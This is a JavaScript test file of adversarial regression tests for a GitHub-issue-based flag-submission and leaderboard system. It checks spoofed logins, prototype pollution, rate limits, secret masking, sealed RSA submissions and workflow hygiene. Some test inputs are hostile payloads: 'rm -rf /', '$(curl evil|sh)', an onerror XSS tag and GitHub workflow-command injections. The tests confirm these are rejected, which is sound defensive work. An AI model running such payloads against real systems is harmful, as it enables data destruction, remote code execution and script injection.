// Adversarial regression tests: injection, spoofing, prototype pollution, abuse of form fields,
// unbounded state, secret leakage and workflow hygiene.
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import crypto from "node:crypto";
import path from "node:path";
import {
  parseIssueBody, processIssue, buildLeaderboard, emptyState, main, pruneAttempts, saveState, GITHUB_LOGIN_RE, errorLines, gitEnv
} from "../.github/scripts/verify-flag.mjs";
import { isValidLogin, buildIssueUrl } from "../site/seal.js";
import { openSealed, loadPrivateKeys, generateSubmitKeyPair, parsePrivateKey, MAX_AGE_MS } from "../.github/scripts/sealed.mjs";
import { CONFIG, ANSWERS, NORMALIZED, ROOT, KEYS, PRIVATE_PEM, PAIR, issue, body, payload, seal } from "./helpers.mjs";

const T0 = "2026-10-08T09:00:00.000Z";
const run = (state, i, now = T0, extra = {}) => processIssue({ issue: i, answers: NORMALIZED, keys: KEYS, config: CONFIG, state, now: new Date(now), ...extra });
const snapshot = s => JSON.stringify(s);

describe("author identity", () => {
  test("unicode look-alike, empty, overlong and malformed logins are ignored without touching state", () => {
    for (const author of ["аlice" /* Cyrillic a */, "alice​", "ａlice", "al ice", "-alice", "alice-", "al--ice", "a".repeat(40), "alice\n::set-output name=x::y"]) {
      const s = emptyState(), before = snapshot(s);
      const r = run(s, issue({ author, login: "alice" }));
      assert.equal(r.status, "ignored", author); assert.equal(r.reason, "bad-author", author);
      assert.equal(snapshot(s), before, `state touched for ${JSON.stringify(author)}`);
    }
    assert.ok(GITHUB_LOGIN_RE.test("a-b-c1") && GITHUB_LOGIN_RE.test("x"));
  });
  test("__proto__ / constructor / prototype cannot pollute objects", () => {
    for (const author of ["__proto__", "constructor", "prototype", "hasOwnProperty"]) {
      const s = emptyState();
      const r = run(s, issue({ author }));
      if (author === "__proto__") assert.equal(r.status, "ignored");
      // "constructor"/"prototype" are valid GitHub logins: they must be stored as plain own keys
      assert.equal(({}).polluted, undefined);
      assert.equal(Object.getPrototypeOf(s.players.players), Object.prototype);
      if (r.status !== "ignored") assert.ok(Object.prototype.hasOwnProperty.call(s.players.players, author.toLowerCase()));
    }
    assert.equal(typeof ({}).constructor, "function");
  });
  test("state loaded with a __proto__ key does not change prototypes", () => {
    const s = emptyState();
    s.players.players = JSON.parse('{"__proto__": {"polluted": true}}');
    s.attempts.processed = JSON.parse('{"__proto__": {"status": "correct"}}');
    const r = run(s, issue({ author: "alice" }));
    assert.equal(r.status, "correct");
    assert.equal(({}).polluted, undefined);
  });
  test("[bot] suffix or Bot type is ignored even if the type field lies", () => {
    assert.equal(run(emptyState(), issue({ author: "dependabot[bot]", type: "User" })).status, "ignored");
    assert.equal(run(emptyState(), issue({ author: "alice", type: "Bot" })).reason, "bot");
  });
  test("non-numeric issue numbers are ignored", () => {
    for (const number of ["1", -1, 0, 1.5, "__proto__"]) assert.equal(run(emptyState(), issue({ number })).reason, "bad-number");
  });
  test("the typed login never grants identity: blob sealed for victim, sent by attacker", () => {
    const s = emptyState();
    const p = seal(payload({ login: "victim", mission: "m7" }));
    const r1 = run(s, issue({ author: "mallory", mission: "m7", sealed: p, login: "victim" }));
    assert.equal(r1.status, "invalid"); assert.equal(r1.reason, "login");
    const r2 = run(s, issue({ author: "mallory", mission: "m7", sealed: p, login: "" }));
    assert.equal(r2.status, "invalid"); assert.equal(r2.reason, "sealed-login");
    assert.equal(s.players.players.victim, undefined);
    assert.equal(s.players.players.mallory, undefined);
    assert.equal(s.attempts.nonces.victim, undefined, "attacker cannot burn the victim's nonce");
  });
});

describe("form field abuse", () => {
  test("hints: only ASCII integers 0..maxHints", () => {
    for (const hints of ["-1", "+1", "1.0", "1e0", "0x1", "٣", "３", "99999999999999999999", "3", "1 2", "", "NaN", "Infinity"]) {
      const r = run(emptyState(), issue({ hints }));
      assert.equal(r.status, "invalid", `hints ${JSON.stringify(hints)}`); assert.equal(r.reason, "hints");
    }
    const ok = run(emptyState(), issue({ hints: "2", mission: "m8" }));
    assert.equal(ok.status, "correct"); assert.equal(ok.xpAwarded, 460);
  });
  test("team: only configured names; markup, headings and prototype names rejected", () => {
    for (const team of ["<img src=x onerror=alert(1)>", "QA; rm -rf /", "__proto__", "constructor", "toString", "QA​", "Q A"]) {
      const r = run(emptyState(), issue({ team }));
      assert.equal(r.status, "invalid", team); assert.equal(r.reason, "team", team);
    }
  });
  test("mission: prototype names and look-alikes rejected", () => {
    for (const mission of ["__proto__", "constructor", "m9", "m0", "ｍ1", "m1x", "m 1"]) {
      const s = emptyState();
      const r = run(s, issue({ mission, sealed: "a".repeat(512) }));
      assert.equal(r.status, "invalid", mission); assert.equal(r.reason, "mission", mission);
      assert.deepEqual(Object.keys(s.players.lastResults.alice), ["_"]);
    }
  });
  test("a heading smuggled inside a field value cannot override an earlier field", () => {
    const raw = body({ mission: "m1", team: "QA" }).replace("### Team\n\nQA", "### Team\n\nQA\n\n### Mission\n\nm8");
    assert.equal(parseIssueBody(raw).mission, "m1");
  });
  test("huge body is parsed quickly with capped field values", () => {
    const big = body({ mission: "m1", sealed: "a".repeat(512) }) + "\n### Team\n\n" + "x".repeat(500000) + "\n" + "### a\n".repeat(50000);
    const t = Date.now();
    const f = parseIssueBody(big);
    assert.ok(Date.now() - t < 1000, "parse took too long");
    for (const [k, v] of Object.entries(f)) assert.ok(v.length <= (k === "sealed" ? 1025 : 200));
    assert.equal(f.mission, "m1");
  });
  test("shell / workflow-command payloads in title and body are inert data", () => {
    const s = emptyState();
    const r = run(s, issue({ title: "[flag] $(curl evil|sh) `id` ::set-output name=changed::true", team: "QA\n::add-mask::x" }));
    assert.equal(r.status, "invalid"); assert.equal(r.reason, "team");
  });
});

describe("state growth and rate limits", () => {
  test("issues over the daily cap do not grow the attempts log", () => {
    const s = emptyState();
    for (let i = 0; i < 80; i++) run(s, issue({ mission: "m1", answer: "zle" + i }), new Date(Date.parse(T0) + i * 1000).toISOString());
    assert.equal(s.attempts.byLogin.alice.length, 30);
    assert.equal(Object.keys(s.attempts.processed).length, 80);
  });
  test("pruneAttempts drops entries older than 48 h and empty logins", () => {
    const s = emptyState();
    run(s, issue({ author: "old", mission: "m1", answer: "zle", ts: "2026-09-30T23:59:00.000Z" }), "2026-10-01T00:00:00Z");
    run(s, issue({ author: "new", mission: "m1", answer: "zle" }), T0);
    assert.deepEqual(Object.keys(s.attempts.nonces).sort(), ["new", "old"]);
    pruneAttempts(s, new Date(T0));
    assert.deepEqual(Object.keys(s.attempts.byLogin), ["new"]);
    assert.deepEqual(Object.keys(s.attempts.nonces), ["new"], "nonces older than the 7-day ts window are pruned");
  });
  test("saveState prunes before writing", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "academy-sec-"));
    const s = emptyState();
    run(s, issue({ author: "old", mission: "m1", answer: "zle", ts: "2026-09-30T23:59:00.000Z" }), "2026-10-01T00:00:00Z");
    saveState(dir, s, CONFIG, new Date(T0));
    const a = JSON.parse(fs.readFileSync(path.join(dir, "state/attempts.json"), "utf8"));
    assert.deepEqual(a.byLogin, {});
    assert.deepEqual(a.nonces, {});
  });
  test("M7 online brute force is capped at 5 guesses per login per 24 h", () => {
    const s = emptyState(); let checked = 0;
    for (let n = 0; n < 50; n++) {
      const r = run(s, issue({ author: "eve", mission: "m7", answer: String(1000 + n) }), new Date(Date.parse(T0) + n * 60000).toISOString());
      if (r.status === "wrong") checked++;
    }
    assert.equal(checked, 5);
  });
});

describe("public leaderboard", () => {
  test("contains no sealed data, nonces, hints, attempts or extra fields", () => {
    const s = emptyState();
    run(s, issue({ author: "alice", mission: "m1", hints: 1 }));
    run(s, issue({ author: "bob", mission: "m2", answer: "nope" }));
    run(s, issue({ author: "carol", mission: "zz" }));
    const lb = buildLeaderboard(s, CONFIG, new Date(T0));
    const txt = JSON.stringify(lb);
    assert.ok(!/[0-9a-f]{32}/i.test(txt), "a nonce-like hex string leaked");
    assert.ok(!/byLogin|processed|nonces|"hints"|attemptsLeft|sealed/.test(txt));
    for (const p of lb.players) assert.deepEqual(Object.keys(p).sort(), ["badges", "level", "login", "solved", "team", "updatedAt", "xp"]);
    for (const byMission of Object.values(lb.lastResults)) for (const r of Object.values(byMission)) assert.deepEqual(Object.keys(r).sort(), ["at", "issue", "status"]);
  });
});

describe("secret handling in main()", () => {
  const setup = () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "academy-sec-"));
    fs.mkdirSync(path.join(dir, "site"), { recursive: true });
    fs.copyFileSync(path.join(ROOT, "site/config.json"), path.join(dir, "site/config.json"));
    const ev = path.join(dir, "event.json");
    return { dir, ev };
  };
  test("malformed ANSWERS never appears in the error", async () => {
    const { dir, ev } = setup();
    fs.writeFileSync(ev, JSON.stringify({ action: "opened", issue: issue() }));
    const secret = '{"m1": SUPERSECRETVALUE, "m2": "x"';
    await assert.rejects(main({ DRY_RUN: "1", ROOT: dir, GITHUB_EVENT_PATH: ev, ANSWERS: secret, SUBMIT_PRIVATE_KEY: PRIVATE_PEM }, () => {}),
      e => !e.message.includes("SUPERSECRET") && /ANSWERS/.test(e.message));
    const partial = JSON.stringify({ m1: "SUPERSECRETVALUE" });
    await assert.rejects(main({ DRY_RUN: "1", ROOT: dir, GITHUB_EVENT_PATH: ev, ANSWERS: partial, SUBMIT_PRIVATE_KEY: PRIVATE_PEM }, () => {}),
      e => !e.message.includes("SUPERSECRET") && !e.message.toLowerCase().includes("supersecret"));
  });
  test("malformed or weak private key: error names the secret, never its content", async () => {
    const { dir, ev } = setup();
    fs.writeFileSync(ev, JSON.stringify({ action: "opened", issue: issue() }));
    const broken = PRIVATE_PEM.replace(/[A-Za-z]{20}/, "SUPERSECRETKEYMATERI");
    await assert.rejects(main({ DRY_RUN: "1", ROOT: dir, GITHUB_EVENT_PATH: ev, ANSWERS: JSON.stringify(ANSWERS), SUBMIT_PRIVATE_KEY: broken }, () => {}),
      e => /SUBMIT_PRIVATE_KEY/.test(e.message) && !e.message.includes("SUPERSECRET") && !e.message.includes("MII"));
    const weak = generateSubmitKeyPair(2048).privatePem;
    assert.throws(() => parsePrivateKey(weak), /3072/);
    assert.throws(() => loadPrivateKeys({ SUBMIT_PRIVATE_KEY: PRIVATE_PEM, SUBMIT_PRIVATE_KEY_OLD: "nope" }), /SUBMIT_PRIVATE_KEY_OLD/);
  });
  test("in Actions: answers are masked, then workflow commands are stopped before anything else is printed", async () => {
    const { dir, ev } = setup();
    const evil = issue({ author: "alice", mission: "m3", title: "[flag] ::set-output name=changed::true" });
    fs.writeFileSync(ev, JSON.stringify({ action: "opened", issue: evil }));
    const logs = [];
    await main({ DRY_RUN: "1", GITHUB_ACTIONS: "true", ROOT: dir, GITHUB_EVENT_PATH: ev, ANSWERS: JSON.stringify(ANSWERS), SUBMIT_PRIVATE_KEY: PRIVATE_PEM, NOW: T0 }, l => logs.push(String(l)));
    const stop = logs.findIndex(l => /^::stop-commands::[0-9a-f]{32}$/.test(l));
    assert.ok(stop >= 0, "stop-commands not emitted");
    const masks = logs.slice(0, stop);
    assert.ok(masks.every(l => l.startsWith("::add-mask::")));
    for (const v of [...Object.values(ANSWERS), ...Object.values(NORMALIZED)].filter(v => v.length >= 4)) {
      assert.ok(masks.includes("::add-mask::" + v), `answer not masked: ${v}`);
    }
  });
  test("in Actions: decrypted plaintext is masked right after decryption (resume -> add-mask -> stop) and never printed", async () => {
    const { dir, ev } = setup();
    const secretGuess = "my-secret-guess-123";
    const sealedPayload = payload({ login: "alice", mission: "m7", answer: secretGuess, nonce: "ab".repeat(16) });
    const i = issue({ author: "alice", mission: "m7", sealedPayload });
    const i2 = issue({ author: "alice", mission: "m6", answer: "  ORD 4 2  " });      // short normalized answer: "ord42"
    const runs = [];
    for (const one of [i, i2]) {   // two separate runs = two separate steps (fresh runner command state)
      fs.writeFileSync(ev, JSON.stringify({ action: "opened", issue: one }));
      const out = [];
      await main({ DRY_RUN: "1", GITHUB_ACTIONS: "true", ROOT: dir, GITHUB_EVENT_PATH: ev, ANSWERS: JSON.stringify(ANSWERS), SUBMIT_PRIVATE_KEY: PRIVATE_PEM, NOW: T0 }, l => out.push(String(l)));
      runs.push(out);
    }
    const logs = runs.flat();
    // walk each run's log like the runner does: track whether commands are currently enabled
    const effectiveMasks = [];
    for (const out of runs) {
      let token = null;
      for (const l of out) {
        if (token === null) {
          const m = l.match(/^::stop-commands::(.+)$/); if (m) { token = m[1]; continue; }
          const a = l.match(/^::add-mask::(.+)$/); if (a) effectiveMasks.push(a[1]);
        } else if (l === `::${token}::`) token = null;
      }
      assert.notEqual(token, null, "commands must be stopped at the end of the run");
    }
    assert.ok(effectiveMasks.includes(secretGuess), "decrypted answer was not masked while commands were enabled");
    assert.ok(effectiveMasks.includes("ord42"), "normalized answer was not masked");
    assert.ok(effectiveMasks.some(m => m.includes('"nonce":"' + "ab".repeat(16))), "decrypted plaintext was not masked");
    // nothing but ::add-mask:: lines may contain the plaintext
    for (const l of logs) if (!l.startsWith("::add-mask::")) {
      assert.ok(!l.includes(secretGuess) && !l.toLowerCase().includes("ord42") && !l.includes("ab".repeat(16)), `plaintext printed: ${l}`);
    }
    // every resume is followed by masks and a fresh stop token; commands end up stopped
    const resumes = logs.map((l, k) => [l, k]).filter(([l]) => /^::[0-9a-f]{32}::$/.test(l));
    assert.ok(resumes.length >= 2);
    for (const [, k] of resumes) {
      let j = k + 1; while (logs[j].startsWith("::add-mask::")) j++;
      assert.ok(j > k + 1, "resume without mask"); assert.match(logs[j], /^::stop-commands::[0-9a-f]{32}$/);
      assert.equal(logs[k], `::${logs.slice(0, k).reverse().find(l => l.startsWith("::stop-commands::")).slice(17)}::`, "resume uses the current stop token");
    }
  });
});

describe("sealed submissions (adversarial)", () => {
  const p0 = () => payload({ login: "alice", mission: "m1" });
  const open = (sealed, extra) => openSealed(sealed, KEYS, extra);
  test("schema: missing/extra/mistyped fields are rejected", () => {
    const bad = [
      { ...p0(), v: 1 }, { ...p0(), v: "2" }, { ...p0(), extra: 1 }, (({ nonce, ...r }) => r)(p0()),
      { ...p0(), login: "Alice" }, { ...p0(), login: "__proto__" }, { ...p0(), mission: "m9" }, { ...p0(), mission: "__proto__" },
      { ...p0(), answer: "" }, { ...p0(), answer: 47 }, { ...p0(), answer: null },
      { ...p0(), hints: 3 }, { ...p0(), hints: -1 }, { ...p0(), hints: 1.5 }, { ...p0(), hints: "1" },
      { ...p0(), nonce: "xyz" }, { ...p0(), nonce: "AB".repeat(16) }, { ...p0(), ts: "yesterday" }, { ...p0(), ts: "2026-13-45T99:99:99Z" },
      { ...p0(), kid: "nope" }
    ];
    for (const p of bad) assert.equal(open(seal(p)).reason, "sealed-schema", JSON.stringify(p).slice(0, 120));
    assert.equal(open(seal({ ...p0(), kid: "0".repeat(16) })).reason, "sealed-kid", "kid must name the key that opened it");
  });
  test("garbled plaintext (not JSON / not UTF-8 / array) is rejected without echoing it", () => {
    const enc = buf => crypto.publicEncrypt({ key: PAIR.publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" }, buf).toString("base64url");
    for (const raw of [Buffer.from("not json SECRET47"), Buffer.from([0xff, 0xfe, 0x00]), Buffer.from("[1,2]"), Buffer.from("null")]) {
      const r = open(enc(raw));
      assert.equal(r.ok, false); assert.equal(r.reason, "sealed-garbled");
      assert.ok(!JSON.stringify(r).includes("SECRET47"));
    }
  });
  test("wrong padding / wrong key / another key size never decrypt", () => {
    const p = Buffer.from(JSON.stringify(p0()));
    const pkcs1 = crypto.publicEncrypt({ key: PAIR.publicKey, padding: crypto.constants.RSA_PKCS1_PADDING }, p).toString("base64url");
    assert.equal(open(pkcs1).reason, "sealed-decrypt");
    const sha1 = crypto.publicEncrypt({ key: PAIR.publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha1" }, p).toString("base64url");
    assert.equal(open(sha1).reason, "sealed-decrypt");
    const other = generateSubmitKeyPair(3072);
    assert.equal(open(seal({ ...p0(), kid: other.submitKey.kid }, other.publicKey)).reason, "sealed-decrypt");
    const small = generateSubmitKeyPair(2048);
    assert.equal(open(seal(p0(), small.publicKey)).reason, "sealed-format", "a 2048-bit ciphertext is not even tried");
  });
  test("key rotation: SUBMIT_PRIVATE_KEY_OLD still opens blobs sealed with the previous public key", () => {
    const next = generateSubmitKeyPair(3072);
    const keys = loadPrivateKeys({ SUBMIT_PRIVATE_KEY: next.privatePem, SUBMIT_PRIVATE_KEY_OLD: PRIVATE_PEM });
    assert.deepEqual(keys.map(k => k.kid), [next.submitKey.kid, PAIR.submitKey.kid]);
    assert.equal(openSealed(seal(p0()), keys).ok, true, "old key");
    assert.equal(openSealed(seal({ ...p0(), kid: next.submitKey.kid }, next.publicKey), keys).ok, true, "new key");
    assert.equal(openSealed(seal(p0()), loadPrivateKeys({ SUBMIT_PRIVATE_KEY: next.privatePem })).reason, "sealed-decrypt", "after the old key is removed");
    // same key twice is de-duplicated
    assert.equal(loadPrivateKeys({ SUBMIT_PRIVATE_KEY: PRIVATE_PEM, SUBMIT_PRIVATE_KEY_OLD: PRIVATE_PEM }).length, 1);
  });
  test("results, state and comments never contain the decrypted answer or payload", () => {
    const s = emptyState();
    const guess = "unique-guess-xyz-987";
    const r1 = run(s, issue({ mission: "m5", answer: guess }));
    const r2 = run(s, issue({ mission: "m6", hints: 0, sealedPayload: payload({ mission: "m6", hints: 1, answer: guess }) }));
    assert.equal(r1.status, "wrong"); assert.equal(r2.reason, "mismatch");
    const all = JSON.stringify([r1, r2, s, buildLeaderboard(s, CONFIG, new Date(T0))]);
    assert.ok(!all.includes(guess));
  });
  test("onSecret is called with the plaintext before any decision", () => {
    const seen = [];
    const r = run(emptyState(), issue({ mission: "m7", answer: "47" }), T0, { onSecret: v => seen.push(v) });
    assert.equal(r.status, "wrong");
    assert.ok(seen.includes("47") && seen.some(v => v.startsWith("{")));
  });
  test("nonces: per login, pruned after the ts window", () => {
    const s = emptyState();
    const n = "cd".repeat(16);
    assert.equal(run(s, issue({ author: "alice", mission: "m1", sealedPayload: payload({ login: "alice", nonce: n }) })).status, "correct");
    assert.equal(run(s, issue({ author: "bob", mission: "m1", sealedPayload: payload({ login: "bob", nonce: n }) })).status, "correct", "nonces are per login");
    pruneAttempts(s, new Date(Date.parse(T0) + MAX_AGE_MS + 120000));
    assert.deepEqual(s.attempts.nonces, {});
  });
});

describe("workflow hygiene (strict)", () => {
  const read = f => fs.readFileSync(path.join(ROOT, ".github/workflows", f), "utf8");
  const files = ["flag.yml", "pages.yml"];
  test("no ${{ }} at all inside run: blocks (single or multi-line)", () => {
    for (const f of files) {
      const lines = read(f).split("\n");
      for (let i = 0; i < lines.length; i++) {
        const m = lines[i].match(/^(\s*)(?:-\s+)?run:\s*(.*)$/);
        if (!m) continue;
        const block = [m[2]];
        const indent = m[1].length;
        for (let j = i + 1; j < lines.length && (lines[j].trim() === "" || lines[j].search(/\S/) > indent); j++) block.push(lines[j]);
        assert.ok(!block.join("\n").includes("${{"), `${f}: expression inside run block at line ${i + 1}`);
      }
    }
  });
  test("safe triggers, deny-by-default permissions, SHA-pinned actions, no persisted creds in deploy jobs", () => {
    for (const f of files) {
      const y = read(f);
      assert.ok(!/pull_request_target|workflow_run|issue_comment/.test(y), `${f}: risky trigger`);
      assert.match(y, /^permissions: \{\}$/m, `${f}: top-level permissions must be {}`);
      for (const [, ref] of y.matchAll(/uses:\s*(\S+)/g)) assert.match(ref, /^actions\/[a-z-]+@[0-9a-f]{40}$/, `${f}: unpinned ${ref}`);
      assert.ok(!/secrets\.[A-Z_]+[^\n]*\n?[^\n]*run:/.test(y.replace(/env:\n(\s+\w+: \$\{\{[^\n]+\n)+/g, "")), `${f}: secret outside env`);
    }
    const flag = read("flag.yml");
    assert.match(flag, /types: \[opened\]/);
    assert.ok(!/^concurrency:/m.test(flag), "flag.yml: concurrency must be job-level (skipped runs must not cancel pending verifications)");
    assert.match(flag, /verify:[\s\S]*?concurrency:\s*\n\s*group: leaderboard\s*\n\s*cancel-in-progress: false[\s\S]*?\n  deploy:/);
    assert.match(flag, /deploy:[\s\S]*persist-credentials: false/);
    assert.match(read("pages.yml"), /persist-credentials: false/);
    assert.match(flag, /verify:[\s\S]*?permissions:\s*\n\s*contents: write[^\n]*\n\s*issues: write[\s\S]*?\n  deploy:/);
    assert.ok(!/verify:[\s\S]*?(pages|id-token): write[\s\S]*?\n  deploy:/.test(flag), "verify must not get pages/id-token");
  });
});

describe("client safety", () => {
  test("isValidLogin matches the verifier regex (ASCII only)", () => {
    for (const l of ["alice", "a-b", "A1", "аlice", "__proto__", "a--b", "-a", "a".repeat(39), "a".repeat(40), "ａ"]) {
      assert.equal(isValidLogin(l), GITHUB_LOGIN_RE.test(l), l);
    }
  });
  test("issue URL encodes every field; answer-like data cannot break out of a parameter", () => {
    const u = new URL(buildIssueUrl({ owner: "o", repo: "r" }, { missionId: "m1", sealed: "a".repeat(512), hints: 0, team: "A&B=C#x", login: "alice" }));
    assert.equal(u.searchParams.get("team"), "A&B=C#x");
    assert.equal(u.hash, "");
  });
  test("leaderboard strings are never rendered with innerHTML", () => {
    const js = fs.readFileSync(path.join(ROOT, "site/app.js"), "utf8");
    for (const line of js.split("\n").filter(l => /innerHTML|insertAdjacentHTML|outerHTML/.test(l))) {
      assert.ok(!/\b(p|t|r|player|S\.me)\.(login|team)\b|lastResults/.test(line), `unsafe HTML sink: ${line.trim()}`);
    }
    assert.match(js, /function avatarEl\(login, cls\) \{\n\s*if \(!isValidLogin\(login\)\)/);
  });
});

describe("adversarial review regressions", () => {
  const T = "2026-10-08T08:59:00.000Z";
  test("sealed: only the canonical base64url spelling of a ciphertext is accepted", () => {
    const s = seal(payload({ login: "alice", mission: "m7", answer: "42", ts: T }));
    assert.equal(openSealed(s, KEYS).ok, true);
    // Node's decoder ignores trailing junk, so these all decode to the very same 384 bytes
    for (const t of [s + "A", s + "Q", s + "AB", s + "A=", s + "=="]) assert.equal(openSealed(t, KEYS).ok, false, `accepted ${t.slice(-4)}`);
    // and therefore cannot be used to resubmit a blob under a "different" value
    const st = emptyState();
    assert.equal(run(st, issue({ author: "alice", mission: "m7", sealed: s })).status, "correct");
    const r = run(st, issue({ author: "alice", mission: "m7", sealed: s + "A" }));
    assert.equal(r.status, "invalid"); assert.equal(r.reason, "sealed-format");
  });
  test("sealed: ts must be a real calendar date", () => {
    for (const ts of ["2026-02-30T00:00:00Z", "2026-13-01T00:00:00Z", "2026-10-08T24:00:00Z", "2026-10-08T08:61:00Z"]) {
      assert.equal(openSealed(seal(payload({ ts })), KEYS).reason, "sealed-schema", ts);
    }
    assert.equal(openSealed(seal(payload({ ts: "2026-10-08T08:59:00Z" })), KEYS).ok, true);
  });
  test("sealed: hints outside 0..maxHints inside the payload are rejected even if the visible field agrees", () => {
    for (const h of [3, -1, 1.5, "1", 1e9, null]) {
      const st = emptyState();
      const r = run(st, issue({ author: "alice", mission: "m7", hints: 0, sealedPayload: { ...payload({ login: "alice", mission: "m7", ts: T }), hints: h } }));
      assert.equal(r.status, "invalid", String(h)); assert.equal(r.reason, "sealed-schema");
    }
  });
  test("fatal error: resume and ::error:: are written to the same stream, resume first", () => {
    assert.deepEqual(errorLines(new Error("boom ::set-output name=x::y\nline2"), "ab".repeat(16)),
      ["::" + "ab".repeat(16) + "::", "::error::boom : :set-output name=x: :y line2"]);
    assert.deepEqual(errorLines(new Error("x"), null), ["::error::x"]);
    const src = fs.readFileSync(path.join(ROOT, ".github/scripts/verify-flag.mjs"), "utf8");
    assert.ok(!/console\.error\(\s*["'`]::error::/.test(src), "::error:: must not go to stderr (no ordering with the stdout resume line)");
  });
  test("git child processes never inherit the secrets", () => {
    const env = gitEnv({ PATH: "/bin", ANSWERS: "{}", SUBMIT_PRIVATE_KEY: "k", SUBMIT_PRIVATE_KEY_OLD: "o", GITHUB_TOKEN: "t" });
    assert.deepEqual(Object.keys(env).sort(), ["GITHUB_TOKEN", "PATH"]);
    const src = fs.readFileSync(path.join(ROOT, ".github/scripts/verify-flag.mjs"), "utf8");
    assert.match(src, /execFileSync\("git", args, \{[^}]*env: gitEnv\(\)/);
  });
  test("nothing answer-derived is published: no hash/digest of an answer anywhere in site/, state/ or verifier output", () => {
    const st = emptyState();
    run(st, issue({ author: "alice", mission: "m7" })); run(st, issue({ author: "bob", mission: "m7", answer: "41" }));
    const hashes = new Set();
    for (const v of [...Object.values(ANSWERS), ...Object.values(NORMALIZED), "41"]) {
      for (const alg of ["sha256", "sha1", "md5"]) for (const pre of ["", "alice:m7:", "bob:m7:"]) {
        const h = crypto.createHash(alg).update(pre + v).digest(); hashes.add(h.toString("hex")); hashes.add(h.toString("base64url"));
      }
    }
    const texts = [JSON.stringify(st), JSON.stringify(buildLeaderboard(st, CONFIG))];
    const walk = d => fs.readdirSync(d, { withFileTypes: true }).flatMap(e => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
    for (const f of [...walk(path.join(ROOT, "site")), ...walk(path.join(ROOT, "state"))]) texts.push(fs.readFileSync(f, "utf8"));
    for (const t of texts) for (const h of hashes) assert.ok(!t.includes(h), "answer hash published");
    for (const t of texts.slice(0, 2)) for (const v of Object.values(NORMALIZED)) assert.ok(!t.includes(`"${v}"`), "answer value in state");
  });
  test("key files: gen-keys refuses a non-.pem output; preview never serves keys", () => {
    const gk = fs.readFileSync(path.join(ROOT, "scripts/gen-keys.mjs"), "utf8");
    assert.match(gk, /\\\.pem\$\/i\.test\(keyPath\)/);
    const pv = fs.readFileSync(path.join(ROOT, "scripts/preview.mjs"), "utf8");
    assert.match(pv, /pem\|key/);
    const gi = fs.readFileSync(path.join(ROOT, ".gitignore"), "utf8").split("\n");
    for (const l of ["*.pem", "keys.local.pem", "answers.local.json"]) assert.ok(gi.includes(l), l);
  });
});
